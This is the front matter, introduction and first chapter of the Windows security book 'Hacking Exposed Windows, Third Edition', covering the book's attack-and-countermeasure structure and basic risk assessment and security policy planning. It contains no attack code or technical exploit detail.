Praise for Hacking Exposed™ Windows®, Third Edition  It’s this ability to help you perform accurate risk assessment that makes Hacking Exposed Windows valuable.  There are few places where you can get a one-stop look at the security landscape in which Windows lives.  Joel  and  his  fellow  contributors  have  done  an  outstanding  job  of  documenting  the  latest  advances  in  threats,  including  buffer  overflows,  rootkits,  and  cross-site  scripting,  as  well  as  defensive  technologies  such  as  no-execute,  Vista’s  UAC,  and  address  space  layout  randomization.  If  understanding  Windows  security is anywhere in your job description, I highly recommend reading this book from back to front and  keeping it as a reference for your ongoing battle.  —Mark Russinovich, Technical Fellow, Microsoft Corporation  “The Hacking Exposed authors and contributors have once again taken their unique experiences and framed  a must-read for the security professional and technology adventurist alike. Start to finish, Hacking Exposed  Windows, Third Edition eliminates the ambiguity by outlining the tools and techniques of the modern cyber  miscreant, arming the reader by eliminating the mystery. The authors continue to deliver the “secret sauce”  in the recipe for cyber security, and remain the Rachael Rays of infosec.”  —Greg Wood, CISO, Washington Mutual  The security threat landscape has undergone revolutionary change since the first edition of Hacking Exposed. The technology available to exploit systems has evolved considerably and become infinitely more available,  intensifying  the  risk  of  compromise  in  this  increasingly  online  world.  Hacking  Exposed  Windows  has  remained the authority on the subject by providing the knowledge and practical guidance Windows system  administrators and security professionals need to be well equipped now and for the journey ahead.  —Pete Boden, General Manager, Online Services Security, Microsoft  “The  friendly  veneer  of  Microsoft  Windows  covers  millions  of  lines  of  code  compiled  into  a  complex  system, often responsible for delivering vital services to its customer. Despite the best intentions of its  creators, all versions of Windows will continue to be vulnerable to attacks at the application layer, at the  kernel, from across the network—and everywhere else in between. Joel Scambray and his fellow contributors  provide a comprehensive catalogue of the threats and countermeasures for Windows in an immensely  readable guide. If Windows is the computing vehicle you must secure, Hacking Exposed Windows is your  driver’s license.”  —Jim Reavis, former Executive Director, Information Systems Security Association  “Computer security is changing with Windows Vista, and hackers are having to learn new methods of  attack. Fortunately, you have their playbook.”  —Brad Albrecht, Senior Security Program Manager, Microsoft  “As Microsoft continues improving its operating systems, Hacking Exposed Windows, Third Edition continues  to  lead  the  industry  in  helping  readers  understand  the  real  threats  to  the  Windows  environment  and  teaches how to defend against those threats. Anyone who wants to securely run Windows, needs a copy of  this book alongside his her PC.”  —James Costello  CISSP  IT Security Specialist, Honeywell   This page intentionally left blank    HACKING EXPOSED™  WINDOWS®:  WINDOWS SECURITY  SECRETS & SOLUTIONS  THIRD EDITION  JOEL SCAMBRAY STUART McCLURE  New York   Chicago   San Francisco    Lisbon   London   Madrid   Mexico City   Milan    New Delhi   San Juan   Seoul   Singapore   Sydney   Toronto   Copyright   2008 by Joel Scambray.

topic that is only becoming broader as we become more reliant on   computers for everything we do, from work to home to leisure, and our computers  become more and more interconnected. Most of our computing experiences now  require, or are enriched by, Internet connections, which means our systems are constantly  exposed to foreign data of unknown or uncertain integrity. When you click search links,  download applications, or configure Internet-facing servers, every line of code through  which  the  data  flows  is  potentially  subject  to  a  storm  of  probing  for  vulnerable  configuration, flawed programming logic, and buggy implementation—even within the  confines of a corporate network. Your data and computing resources are worth money in  the Web 2.0 economy, and where there’s money, there are people who want to steal it.  As the Web has evolved, we’ve also seen the criminals evolve. Ten years ago, the  threat was an e-mail-borne macro virus that deleted your data. Five years ago, it was  automatically propagating worms that used buffer overflows to enlist computers into  distributed  denial  of  service  attack  networks.  Three  years  ago,  the  prevalent  threat  became malware that spreads to your computer when you visit infected websites and  that subsequently delivers popup ads and upsells you rogue anti-malware. More recently,  malware  uses  all  these  propagation  techniques  to  spread  into  a  stealthy  distributed  network of general-purpose “bots” that serve up your data, perform denial of service, or  spew spam. The future is one of targeted malware that is deliberately low-volume and  customized for classes of users, specific corporations, or even a single individual.  We’ve also seen computer security evolve. Antivirus is everywhere, from the routers  on the edge to servers, clients, and soon, mobile devices. Firewalls are equally ubiquitous  and lock down unused entry and exit pathways. Operating systems and applications are  written with security in mind and are hardened with defense-in-depth measures such as  no-execute  and  address  layout  randomization.  Users  can’t  access  corporate  networks  without passing health assessments.  One  thing  is  clear:  there’s  no  declaration  of  victory  possible  in  this  battle.  It’s  a  constant struggle where winning means keeping the criminals at bay another day. And  there’s also no clear cut strategy for success. Security in practice requires risk assessment,  and successful risk assessment requires a deep understanding of both the threats and the  defensive technologies.  xvii   xviii   Hacking Exposed Windows: Windows Security Secrets & Solutions   It’s  this  ability  to  help  you  perform  accurate  risk  assessment  that  makes  Hacking Exposed Windows valuable. There are few places where you can get a one-stop look at the  security landscape in which Windows lives. Joel and his fellow contributors have done  an  outstanding  job  of  documenting  the  latest  advances  in  threats,  including  buffer  overflows, rootkits, and cross-site scripting, as well as defensive technologies such as  no-execute,  Vista’s  UAC,  and  address  space  layout  randomization.  If  understanding  Windows security is anywhere in your job description, I highly recommend reading this  book from back to front and keeping it as a reference for your ongoing battle.  —Mark Russinovich Technical Fellow, Microsoft Corporation   ACKNOWLEDGMENTS  First and foremost, many special thanks to all our families for once again supporting   us  through  still  more  months  of  demanding  research  and  writing.  Their  understanding and support was crucial to us completing this book. We hope that   we can make up for the time we spent away from them to complete this project.  Secondly, we would like to thank all of our colleagues who contributed directly to  this book, including Jussi Jaakonaho and everyone at Toolcrypt for their always innovative  updates to the chapters on Windows remote hacking and post-exploit pillaging; Robert  Hensing  of  Microsoft  for  his  tour  de  force  chapter  on  Windows  rootkits  and  stealth  techniques;  Blake  Frantz  of  Leviathan  for  his  crisp  technical  exploration  of  Windows  vulnerability discovery and exploitation, as well as the new security features and tools  in Vista and Windows Server 2008; Chip Andrews, whose contribution of the latest and  greatest  SQL  security  information  was  simply  stellar,  as  always;  David  Wong  for  his  assistance with client-side security; and of course Mark Russinovich, whose Foreword  and  many  years  of  contributions  to  the  industry  via  tools,  research,  and  writing  are  appreciated beyond words.  As always, we bow profoundly to all of the individuals who tirelessly research and  write the innumerable tools and proof-of-concept code that we document in this book, as  well  as  all  of  the  people  who  continue  to  contribute  anonymously  to  the  collective  codebase of security each day.  Of course, big thanks must also go to the tireless McGraw-Hill editors and production  team  who  worked  on  the  book,  including  our  indefatigable  acquisitions  editor  Jane  Brownlow, acquisitions editor Megg Morin who provided great guidance while Jane  was away, Hacking Exposed hall-of-fame editor LeeAnn Pickrell, production guru Jim  Kussow, and editorial assistant Jenni Housh who kept things on track over a long period  of writing and development.  And finally, a tremendous “Thank You” to all of the readers of the previous editions  of this book, and all the books in the Hacking Exposed series, whose continuing support  makes all of the hard work worthwhile.  xix   This page intentionally left blank    INTRODUCTION  WINDOWS SECURITY: A JOURNEY, NOT A DESTINATION  If you are to believe the U.S. government, Microsoft Corporation controls a monopoly  share of the computer operating system market and possibly many other related software  markets as well  web browsers, office productivity software, and so on . And despite  continued jeers from its adversaries in the media and the marketplace, Microsoft manages  to hold on to this “monopoly” year after year, flying in the face of a lengthening history  of  flash-in-the-pan  information  technology  startups  ground  under  by  the  merciless  onslaught of change and the growing fickleness of the digital consumer. Love ‘em, hate  ‘em, or both, Microsoft continues to produce some of the most broadly popular software  on the planet today.  And yet, in parallel with this continued popularity, most media outlets and many  security authorities still continue to portray Microsoft’s software as fatally flawed from  a security perspective. If Bill Gates’ products are so insecure, why do they seem to remain  so popular?  The Windows Security Gap  The answer is really quite simple. Microsoft’s products are designed for maximum ease- of-use, which drives their rampant popularity. What many fail to grasp is that security is  a zero-sum game: the easier it is to use something, the more time and effort must go into  securing it. Think of security as a continuum between the polar extremes of 100 percent  security on one side and 100 percent usability on the other, where 100 percent security  equals 0 percent usability, and 100 percent usability equates to 0 percent security.  Over  time,  Microsoft  has  learned  to  strike  a  healthier  balance  on  this  continuum.  Some things they have simply shut off in default configurations  IIS in Windows Server  2003 comes to mind . Others they have redesigned from the ground up with security as  a priority  IIS’ re-architecture into kernel-mode listener and user-mode worker threads is  also exemplary here . More recently, Microsoft has wrapped “prophylactic” technology  and  UI  around  existing  functionality  to  raise  the  bar  for  exploit  developers   we’re  thinking of ASLR, DEP, MIC, and UAC in Vista . And, of course, there has been a lot of  work on the fundamentals—patching code-level vulnerabilities on a regular basis  “Patch  Tuesday”  is  now  hardened  into  the  lexicon  of  the  Windows  system  administrator ,   xxi   xxii   Hacking Exposed Windows: Windows Security Secrets & Solutions   improving visibility and control  the Windows Security Center is now firmly ensconced  in the System Tray Notification Area of every modern Windows installation , adding  new  security  functionality   Windows  Defender  anti-spyware ,  and  making  steady  refinements   witness  the  Windows  Firewall’s  progression  from  mostly  standalone  IP  filter to integrated, policy-driven, bidirectional, app user-aware market competitor .  Has  it  worked? Yes,  Windows  Vista  is  harder  to  compromise  out  of  the  box  than  Windows  NT  4,  certainly.  Is  it  perfect?  Of  course  not—practical  security  never  is   remember  that  continuum .  And,  like  a  rubber  balloon  filled  with  water,  the  more  Microsoft has squeezed certain types of vulnerabilities, the more others have bulged out  to  threaten  unassuming  users.  We  discuss  some  of  the  new  attack  approaches  in  this  book, including device driver vulnerabilities that leave systems open to compromise by  simply brushing within range of a wireless network and insidious stealth technology  deposited by “drive-by” web browsing, just to name two.  As Microsoft Chairman Bill Gates said in his “Trustworthy Computing” memo of  January  2002   http:  www.microsoft.com mscorp execmail 2002 07-18twc.mspx ,  “[security]… really is a journey rather than a destination.” Microsoft has made progress  along the road. But the journey is far from over.  Hacking Exposed: Your Guide to the Road Ahead  Hacking Exposed Windows is your guide to navigating the long road ahead. It adapts the  two-pronged  approach  popularized  in  the  original  Hacking  Exposed,  now  in  its  Fifth  Edition.  First, we catalog the greatest threats your Windows deployment will face and explain  how they work in excruciating detail. How do we know these are the greatest threats?  Because we are hired by the world’s largest companies to break into their Windows-based  networks, servers, products, and services, and we use the same tools and techniques on a  daily basis to do our jobs. And we’ve been doing it for nearly a decade, researching the  most recently publicized hacks, developing our own tools and techniques, and combining  them  into  what  we  think  is  the  most  effective  methodology  for  penetrating  Windows  security in existence.  Once we have your attention by showing you the damage that can be done, we tell you  how  to  prevent  each  and  every  attack.  Running  Windows  without  understanding  the  information in this book is roughly equivalent to driving a car without seatbelts—down a  slippery road, over a monstrous chasm, with no brakes, and the throttle jammed on full.  Embracing and Extending Hacking Exposed  For all of its similarities, Hacking Exposed Windows is also distinct from the original title  in  several  key  ways.  Obviously,  it  is  focused  on  one  platform,  as  opposed  to  the  multidisciplinary  approach  of  Hacking  Exposed.  While  Hacking  Exposed  surveys  the  Windows security landscape, this book peels back further layers to explore the byte-level  workings of Windows security attacks and countermeasures, revealing insights that will  turn  the  heads  of  even  seasoned  Windows  system  administrators.  It  is  this  in-depth  analysis that sets it apart from the original title, where the burdens of exploring many  other computing platforms necessitate superficial treatment of some topic areas.   Introduction   xxiii  Throughout this book, we use the phrase Windows to refer to all systems based on Microsoft’s “New  Technology”  NT  platform, including Windows NT 3.x–4.x, Windows 2000, Windows XP, Windows  Server 2003, Vista, and Windows Server 2008  code name Longhorn . In contrast, we will refer to the  Microsoft DOS Windows 1.x 3.x 9x Me lineage as the “DOS Family.”  You will find no aspect of Windows security treated superficially in this book. Not  only does it embrace all of the great information and features of the original Hacking Exposed, it extends it in significant ways. Here, you will find all of the secret knowledge  necessary to close the Windows security gap for good, from the basic architecture of the  system to the undocumented Registry keys that tighten it down.  HOW THIS BOOK IS ORGANIZED  This book is the sum of its parts, which are described below from broadest organizational  level to the most detailed.  Chapters: The Hacking Exposed Methodology  The chapters in this book follow a definite plan of attack. That plan is the methodology  of the malicious hacker, adapted from Hacking Exposed:     Footprint    Scan    Enumerate    Exploit    Pillage    Stealth  This structure forms the backbone of this book, for without a methodology, this would  be nothing but a heap of information without context or meaning.  We’ve wrapped this basic outline with the following additional components:     Overview of Windows’ security architecture    Attacking SQL Server    Attacking Internet clients    Physical attacks    Windows security features and tools  Modularity, Organization, and Accessibility  Clearly, this book could be read from start to finish to achieve a soup-to-nuts portrayal of  Windows  penetration  testing.  However,  like  Hacking  Exposed,  we  have  attempted  to  make  each  section  of  each  chapter  stand  on  its  own,  so  the  book  can  be  digested  in  modular chunks, suitable to the frantic schedules of our target audience.   xxiv   Hacking Exposed Windows: Windows Security Secrets & Solutions   Moreover, we have strictly adhered to the clear, readable, and concise writing style  that readers overwhelmingly responded to in Hacking Exposed. We know you’re busy,  and  you  need  the  straight  dirt  without  a  lot  of  doubletalk  and  needless  jargon. As  a  reader of Hacking Exposed once commented, “Reads like fiction, scares like hell!”  We think you will be just as satisfied reading from beginning to end as you would   piece by piece, but it’s built to withstand either treatment. Chapter Summaries and References and Further Reading In an effort to improve the organization of this book, we have included the standard  features  from  the  previous  edition  at  the  end  of  each  chapter:  a  “Summary”  and  “References and Further Reading” section.  The “Summary” is exactly what it sounds like, a brief synopsis of the major concepts  covered in the chapter, with an emphasis on countermeasures. We would expect that if  you read the “Summary” from each chapter, you would know how to harden a Windows  system to just about any form of attack.  “References and Further Reading” includes URLs, publication information, and any  other detail necessary to locate each and every item referenced in the chapter, including  Microsoft  Security  Bulletins,  Service  Packs,  Hotfixes,  Knowledge  Base  articles,  third- party  advisories,  commercial  and  freeware  tools,  Windows  hacking  incidents  in  the  news,  and  general  background  reading  that  amplifies  or  expands  on  the  information  presented in the chapter. You will thus find few URLs within the text of the chapters  themselves—if you need to find something, turn to the end of the chapter, and it will be  there.  We  hope  this  consolidation  of  external  references  into  one  container  improves  your overall enjoyment of the book. Appendix A: The Windows Hardening Checklist We took all of the great countermeasures discussed throughout this book, boiled them  down to their bare essences, sequenced them appropriately for building a system from  scratch, and stuck them all under one roof in Appendix A. Yes, there are a lot of Windows  security checklists out there, but we think ours is the most real-world, down-to earth, yet  rock-hard set of recommendations you will find anywhere.  THE BASIC BUILDING BLOCKS: ATTACKS AND  COUNTERMEASURES  As with the entire Hacking Exposed series, the basic building blocks of this book are the  attacks and countermeasures discussed in each chapter.  The attacks are highlighted here as they are throughout the Hacking Exposed series:  This Is an Attack Icon Highlighting attacks like this makes it easy to identify specific penetration-testing tools  and  methodologies  and  points  you  right  to  the  information  you  need  to  convince  management to fund your new security initiative.   Introduction   xxv  Each  attack  is  also  accompanied  by  a  Risk  Rating,  scored  exactly  as  in  Hacking  Exposed:  Popularity:  Simplicity:  Impact:  Risk Rating:  The frequency of use in the wild against live targets, 1  being most rare, 10 being widely used The degree of skill necessary to execute the attack, 10 being  little or no skill, 1 being seasoned security programmer The potential damage caused by successful execution of  the attack, 1 being revelation of trivial information about  the target, 10 being superuser account compromise or  equivalent The preceding three values are averaged to give the overall  risk rating and rounded to the next highest whole number  Countermeasures, in turn, receive their own special visual flourish:  This Is a Countermeasure icon These  sections  typically  follow  each  “attack”  description  and  discuss  the  preventive,  detective, and reactive controls that you can put in place to mitigate the just-described  exploit. Many times we will reference the official Microsoft Security Bulletin relevant to  the attack at hand. Microsoft Security Bulletins include technical information about the  problem, recommended workarounds, and or software patches. The Bulletin number  can be used to find the bulletin itself via the Web: http:  www.microsoft.com technet security bulletin MS-.asp  where MS- represents the actual Bulletin number, For example, MS07-039 would  be the 39th bulletin of 2007.  Sometimes  we  will  also  use  the  Bugtraq  ID,  or  BID,  which  refers  to  the  tracking  number given to each vulnerability by Securityfocus.com’s famous Bugtraq mailing list  and vulnerability database. This also allows the Bugtraq listing to be looked up directly  via the following URL: http:  www.securityfocus.com bid   where  represents the BID  for example, 1578 .  We  also  make  use  of  the  Common  Vulnerabilities  and  Exposures  notation   CVE,  http:  cve.mitre.org  to reference vulnerabilities. CVE notation is similar to Microsoft’s:  CVE--$$$$, where the first set of four digits is the year, and the second is the numeric  vulnerability identifier. For example, CVE-2007-3826 is the 3,286th vulnerability cataloged  by CVE in the year 2007.  Throughout this book, we also use a common syntax for referring to Microsoft Knowledge Base  KB   articles:  http:  support.microsoft.com ?kbid=123456,  where  123456  represents  the  six-digit  KB  article ID.   xxvi   Hacking Exposed Windows: Windows Security Secrets & Solutions   Other Visual Aids  We’ve also made prolific use of visually enhanced  icons to highlight those nagging little details that often get overlooked.  ONLINE RESOURCES AND TOOLS  Windows security is a rapidly changing discipline, and we recognize that the printed  word  is  often  not  the  most  adequate  medium  to  keep  current  with  all  of  the  new  happenings in this vibrant area of research.  Thus,  we  have  implemented  a  World  Wide  Web  site  that  tracks  new  information  relevant  to  topics  discussed  in  this  book,  along  with  errata,  and  a  compilation  of  the  public-domain  tools,  scripts,  and  dictionaries  we  have  covered  throughout  the  book.  That site address is: http:  www.winhackingexposed.com  It also provides a forum to talk directly with the lead author via email:  joel@winhackingexposed.com  We hope that you return to the site frequently as you read through these chapters to  view any updated materials, gain easy access to the tools that we mention, and otherwise  keep up with the ever-changing face of Windows security. Otherwise, you never know  what new developments may jeopardize your network before you can defend yourself  against them.  A FINAL WORD TO OUR READERS  There are a lot of late nights and worn-out keyboards that went into this book, and we  sincerely hope that all of our research and writing translates to tremendous time savings  for those of you responsible for securing Windows. We think you’ve made a courageous  and  forward-thinking  decision  to  deploy  Microsoft’s  flagship  OS—but  as  you  will  discover  in  these  pages,  your  work  only  begins  the  moment  you  remove  the  shrink- wrap. Don’t panic—start turning the pages and take great solace that when the next big  Windows security calamity hits the front page, you won’t even bat an eye.  —Joel   I n f o r m at i o n   S e c u r i t y   B a s i c s  1  1   2   Hacking Exposed Windows: Windows Security Secrets & Solutions   It’s difficult to talk about any system in a vacuum, especially a system that is so widely   deployed in so many roles as Windows in all of its flavors. This chapter previews  some basic information system security defensive postures so that your understanding   of the specifics of Windows is better informed.  A FRAMEWORK FOR OPERATIONAL SECURITY  Because of its sheer ubiquity, the Windows operation system is likely to be touched by  many people, processes, and other technologies during the course of its duty cycle. Thus,  any consideration of Windows security would be incomplete if it did not start with an  acknowledgment that it is just one piece of a much larger puzzle.  Of course, here’s where the challenge arises. This book covers the bits and bytes that  make up Windows security, a finite universe of measures that can be taken to prevent  bad things from happening. However, as any experienced IT professional knows, a lot  more than bits and bytes are needed for a good security posture. What are some key non- technical considerations for security? Another book probably needs to be written here,  but we’ll try to outline some of the big pieces in the following discussion to reduce the  confusion to a minimum so that readers can focus on the meat and potatoes of Windows  security throughout the rest of this book.  Figure  1-1  illustrates  a  framework  for  operational  security  within  a  typical  organization. The most telling thing to note about this framework at first glance is that it  is cyclical. This aligns the model with the notion of security as a journey, not a destination.  New security threats are cropping up all the time  just tap into any of the popular security  mailing lists, such as Bugtraq, to see this , and thus any plan to address those threats  must be ongoing, or cyclic.  The  four  elements  of  the  “security  wheel”  shown  in  Figure  1-1  are  Plan,  Prevent,  Detect, and Respond. While such frameworks are sometimes criticized as “one size fits  all” thinking that may not align with established organizational structures or cultures,  we’ve  found  that  these  four  simple  building  blocks  are  the  most  resonant  with  our  consulting clients who run IT shops of all sizes, and they generally encompass all the  various components of their security efforts. Let’s talk about each one of these in turn.  Figure 1-1  A framework for operational security   Chapter 1:   Information Security Basics   3  Plan  Security  is  a  challenging  concept,  especially  when  it  comes  to  technology.  When  considering how to provide security, you need to begin planning around the following  questions:     What asset am I trying to secure?    What are the asset’s security requirements?    What are the risks unique to that asset’s security requirements?    How do I prioritize and most efﬁ ciently address those risks  especially those   with heavy impact such as industry and regulatory compliance requirements ?  These  questions  describe  a  risk-based  approach  to  security,  popularized  by  many  modern practitioners. Well-known risk-based security methodologies include the CERT’s  Operationally Critical Threat, Asset, and Vulnerability Evaluation  OCTAVE  Method.  Microsoft also promotes their own approach to risk management in software development  scenarios, which they call threat modeling. We will articulate an oversimplified adaptation  of common risk management best practices here, and we encourage readers interested in  more details to consult the “References and Further Reading” section at the end of this  chapter.  Let’s start with the determination of assets. This exercise is not as straightforward as  you  might  think—assets  can  be  server  hardware,  information  in  a  database,  or  even  proprietary manufacturing practices. In fact, we are often amazed when our consulting  clients are sometimes unable to provide a coherent answer to the simple question, “What  are your most important assets?” We often find it helpful to scope the answer to this  question  narrowly  at  first,  perhaps  limiting  the  scope  to  digital  information  assets  considered valuable to the organization. Of course, the physical vessels upon which the  digital assets travel  be they computer servers, or USB thumb drives, or kiosk computer  monitors, or paper printouts  are also of critical importance to security, but we’ve found  that it’s easier to consider those relationships later in the risk assessment process. We also  recommend  postponing  consideration  of  less  tangible  assets  such  as  reputation  until  you’ve first acquired some practice at the risk-management game.  Sensitive digital information asset categories to consider include credentials  such as  passwords and private cryptographic keys , personally identifiable information  remember  that sensitivity can depend on whether consent is granted for specific uses , liquid financial  instruments or information  such as credit card data , proprietary information  including  unreported financial results or business methodologies , and the availability of productive  functionality  including access to functional systems, electricity, and so on .  Once you have determined what assets you are trying to secure, your next step is to  identify each asset’s security requirements, if any. As with assets, it’s quite helpful to  classify security requirements into their most generic categories. Most modern definitions  of information system security center around protecting the confidentiality, integrity, and  availability  CIA  of important assets, so this is our recommendation. One might consider  another A, for accountability, to capture the notion that the system must also faithfully  record activity so that it can be subsequently examined or audited  such as through audit  logging .   4   Hacking Exposed Windows: Windows Security Secrets & Solutions   At this point, you may consider grouping assets into classes based on their perceived sensitivity to the  organization. This can yield a system of policies and supporting controls for each asset type. For  example, High Sensitivity assets such as credit card information may require encryption when stored  or  transmitted,  whereas  Low  Sensitivity  assets  would  not.  Here  again,  compliance  requirements  should be considered  such as with credit card data that likely falls under the Payment Card Industry  Data Security Standard, or PCI DSS .  With assets and security requirements in place, it is time to consider the risks that  each asset faces. This process is commonly called risk assessment. Several approaches to  risk assessment exist, but the one we recommend is the least formal: logically diagram  the system in question, decomposed into its constituent parts, paying close attention to  boundaries and interfaces between each component as well as key assets, and brainstorm  the possible threats to CIAA that they face.  Some  more  systematic   but  not  necessarily  superior   approaches  to  conceptualizing  threats  include attack trees and Microsoft’s threat modeling methodology. See “References and Further  Reading.”  Quantifying Risk Once you have derived a list of threats, you should systematically prioritize them so that  they  can  be  addressed  efficiently.  Over-commitment  of  resources  to  mitigate  low-risk  threats  can  be  just  as  damaging  to  an  organization  as  under-spending  on  high-risk  mitigations, so it’s important to get this step right.  Numerous systems can be used for quantifying and ranking security risk. A classic   and simple approach to risk quantification is illustrated in the following formula:  Risk = Impact × Probability  This is a simple system to understand, and it even enables greater collaboration between  business and security interests within the organization. For example, the quantification  of business Impact could be delegated to the office of the chief financial officer  CFO ,  and the Probability estimation could be assigned to the chief security officer  CSO , or  their equivalents. This produces a smart division of labor and accountability when it  comes to managing risk for the organization overall.  In this system, Impact is usually expressed in monetary terms, and Probability as a  percentage likelihood between 0 and 100 percent. For example, a vulnerability with a  $100,000 impact and a 30 percent probability has a risk ranking of $30,000  $100,000 ×  0.30 .  Hard-currency  estimates  like  this  usually  get  the  attention  of  management  and  drive more practicality into risk quantification. The equation can be componentized even  further by breaking Impact into  Assets × Threats  and Probability into  Vulnerabilities ×  Mitigations .   Chapter 1:   Information Security Basics   5  We’ve seen risk models that factor components further. For example, if system component A has 3  high-impact  vulnerabilities,  but  component  A  is  connected  to  another  system  in  a  fully  trusted  configuration that has 12 vulnerabilities, you could calculate a total vulnerability surface of  3 + 12 2, or the square of the sum of vulnerabilities.  Other  popular  risk  quantification  approaches  include  Microsoft’s  DREAD  system   Damage potential, Reproducibility, Exploitability, Affected users, and Discoverability , as well as the simplified system used by the Microsoft Security Response Center in their  security bulleting severity ratings. The Common Vulnerability Scoring System  CVSS  is  a  somewhat  more  complex  but  potentially  more  accurate  representation  of  common  software vulnerability risks.  We really like the componentized approach that inflects a  base  security  risk  score  with  temporal  and  environmental  factors  unique  to  the  application.  Links to more information about all of these systems can be found at the  end of this chapter in “References and Further Reading.”  We encourage you to tinker with each of these approaches and determine which one  is right for you and your organization. Perhaps you may even develop your own, based  on concepts garnered from each of these approaches, or build one from scratch. Risk  quantification can be quite subjective, and it’s unlikely that you’ll ever find a system that  results in consensus among even a few people. Just remember the main point: Apply  whatever system you choose consistently over time so that relative ranking of threats is  consistent. This is after all the goal—deciding which threats will be addressed in priority.  We’ve also found that it’s very helpful to set a threshold risk level, or “risk bar,” above  which a given threat must be mitigated. There should be broad agreement on where this  threshold  lies  before  the  ranking  process  is  complete.  This  creates  consistency  across  assessments and makes it harder to game the system by simply moving the threshold  around.  It also tends to smoke out people who deliberately set low scores to come in  below the risk bar.  Policy Clearly, the optimal thing to do with the risks that are documented during the assessment  process is to mitigate or eliminate them  although other options exist, including transfer  of the risk via purchasing insurance, or acceptance as-is . Determining the mitigation  plan for these risks is the heart of the Planning phase: policy development.  Policy is central to security; without it, security is impossible. How can something be  considered a breach of security without a policy to define it? Policy defines how risks to  assets are mitigated on a continuous basis. Thus, it should be based firmly on the risk  assessment process.  That said, a strong organizational security policy starts with a good template. We  recommend  the  ISO  17799  policy  framework,  which  has  become  quite  popular  as  a  framework for security policy since becoming an international standard. ISO 17799 is  being incorporated into the new ISO 27000–series standards, which encompass a range    6   Hacking Exposed Windows: Windows Security Secrets & Solutions   of information security management standards and practices  similar to the widely used  ISO 9000–series quality assurance standards . ISO 27001 includes a controls framework  for implementing and measuring compliance with the policy standards. Other popular  control  frameworks  include  COBIT,  COSO,  and  ITIL.   See  “References  and  Further  Reading” for links to information on these standards.   Another  great  dividend  that  arises  from  basing  your  policy  on  widely  accepted  standards such as ISO 17799 is the improved agility to meet evolving compliance regimes  such as these:     Sarbanes-Oxley Act of 2002 requiring U.S. publicly held companies to   implement, evaluate, and report on internal controls over their ﬁ nancial  reporting, operations, and assets.    Basel II: The International Convergence of Capital Measurement and Capital Standards:   A Revised Framework that revises international standards for measuring the  adequacy of a bank’s capital based on measured risk  including operational  risk, such as information system security .     Payment Card Industry Data Security Standard  PCI DSS  for any entity that  processes, stores, or transmits credit card information from major issuers such  as Visa, MasterCard, and American Express.     Health Insurance Portability and Accountability Act of 1996  HIPAA , which   speciﬁ es a series of administrative, technical, and physical security procedures  for covered entities to use to assure the conﬁ dentiality of electronic protected  health information.     Gramm-Leach-Bliley Act of 1999  GLBA  regulating U.S. consumers’ personal   ﬁ nancial information held by ﬁ nancial institutions.     Security breach notiﬁ cation laws evolving in many U.S. states today  such as   California’s SB 1386 .  Even if your organization isn’t covered by one of these regulations  and we bet you  are somehow! , it’s probably only a matter of time before you’ll need to be compliant  with their statutes in one form or another. If you even think your organization needs to  meet some sort of regulatory compliance requirements, we cannot emphasize enough  the  efficiency  gained  by  re-using  one  security  program  framework  for  meeting  the  evolving alphabet soup of compliance requirements facing modern business today. And  we’ve got the scars to prove it, having personally designed and implemented an ISO  17799–based  security  policy  that  successfully  passed  audits  of  compliance  for  SOX,  GLBA, PCI, and other one-off regulatory enforcement actions by the U.S. government.  Although  the  importance  of  meeting  evolving  compliance  requirements  can’t  be  overemphasized, smaller organizations with more narrowly scoped needs may find ISO  standards  and  supporting  frameworks  burdensome  to  plan  and  implement.  For  organizations of all sizes, a good  but expensive  collection of prewritten security policies  is Charles Cresson Woods’ Information Security Policies Made Easy  Information Shield,  2005 . We’d also recommend reading RFCs 2196 and 2504, “Site Security Handbook” and    Chapter 1:   Information Security Basics   7  “User  Handbook,”  respectively,  for  great  policy  ideas.  A  simple  Internet  search  for  “information security policies” will also turn up some great examples, such as at many  educational institutions that publish their policies online.  A  discussion  of  organizational  security  policy  development  and  maintenance  lies   outside the scope of this book. However, here are a few tips:  Understand the Business  Security practitioners must first understand the business that  they are there to help protect; understanding business operations creates the vocabulary  to enable a constructive conversation and leads to being perceived as an enabler, rather  than  a  hindrance.  In  our  experience,  security  practitioners  generally  need  to  become  more  mature  in  this  department,  to  present  information  security  risk  in  appropriate  business terms. Focusing on collaborative approaches to measuring risk and implementing  measurable controls is always a smarter way to get resources from business leaders, in  our experience.  Cultural  Buy-in  Convince  management  to  read  thoroughly  and  support  the  policy.  Management ultimately enforces the policy, and if managers don’t believe it’s correct,  you’ll have an extraordinarily difficult time getting anyone in the organization to follow  it. Consider creating a governance body that comprises key organizational stakeholders,  with defined accountabilities, to evolve and enforce the policy long-term.  At the same time, recognize that executive buy-in is useful only if company personnel  listen to executives, which isn’t always the case in our experience. At any rate, some level  of grassroots buy-in is always necessary, no matter how firmly management backs the  policy; otherwise, it just won’t get adopted to the extent required to make significant  changes to security. Make sure to evangelize and pilot your security program well at all  levels of the organization to ensure that it gets widespread buy-in and that it will be  perceived as a reasonable and practical mechanism for improving organizational security  posture  and thus the bottom line . This will greatly enhance its potential for becoming  part of the culture rather than some bolt-on process that everybody mocks  think TPS  reports from the movie Office Space .  Multi-tiered  Approach  Draft  the  actual  policy  as  a  high-level  statement  of  guiding  principles and intent, and then create detailed implementation standards and operational  procedures that support the policy mandates. This multi-tiered, hierarchical approach  creates modularity that eases maintenance of the policy in the long term by providing  flexibility to change implementation details without requiring a full policy review and  change cycle.  Process for Exceptions, Change  The only constant is change, and that goes for security  policies, too. Expect that your organization will make policy exception requests and will  want to change the policy at regular intervals. You will need to create a process by which  this is accomplished. We recommend at least annual reviews and also a special process  for exceptions and emergency changes. You can make these processes as cumbersome as  you’d  like  to  discourage  frequent  exception  requests  and or  changes  to  the  policy   grin .   8   Hacking Exposed Windows: Windows Security Secrets & Solutions   Awareness  We’ll talk about training and education in the next section of this chapter  when  we  talk  about  the  Prevent  phase  of  the  security  wheel,  but  making  sure  that  everyone in an organization is aware of the policy and understands its basic tenets is  critical.  We  have  also  found  that  performing  regular  awareness  training  for  all  staff  typically generates great practical feedback, leading to a stronger security program over  the long term.  With  a  policy  defined  and  implemented,  we  can  continue  on  around  the  security   wheel defined in Figure 1-1.  Prevent  The necessity for several preventive controls will likely become obvious during the risk  assessment  and  policy  development  process.  This  book  will  list  specific  technical  countermeasures  to  all  of  the  attacks  we  discuss,  but  what  sort  of  broader  proactive  measures should be in place to mitigate risks, enforce security policy, deter attackers,  and promote good security hygiene? Consider the following items:     Education and training    Communications    Security operations    Security architecture  Education and training are the most obvious ways to scale a security effort across an  organization. Communications can assist this effort by scheduling regular updates for  line staff and senior management as well as keeping the information flowing between  the rest of the organization and the security group.  Remember that no security exists in  a vacuum.   Security operations include general security housekeeping, such as security patch  management, malware protection, access control  both physical and 